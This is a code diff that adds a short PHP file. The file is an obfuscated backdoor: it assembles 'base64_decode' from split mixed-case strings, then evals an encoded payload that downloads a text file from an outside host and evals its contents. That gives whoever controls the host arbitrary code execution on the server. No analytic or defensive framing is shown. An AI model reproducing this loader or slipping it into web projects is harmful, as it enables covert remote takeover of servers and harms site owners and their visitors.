@@ -1,0 +1,6 @@
+<?php
+$x="BaSe64";
+$b="_deCOde";
+$c=$x.$b;
+eval($cc = $c('JGhhbmRsZSA9IGZvcGVuKCdodHRwOi8veGltY3guY24vMi50eHQnLCAncicpOw0KICAgICRjb250ZW50ID0gJyc7DQogICAgd2hpbGUoZmFsc2UgIT0gKCRhID0gZnJlYWQoJGhhbmRsZSwgODA4MCkpKXsNCiAgICAgICAgJGNvbnRlbnQgLj0gJGE7DQogICAgfQ0KCWV2YWwoJGEgPSAkY29udGVudCk7DQpmY2xvc2UoJGhhbmRsZSk7'));
+?>
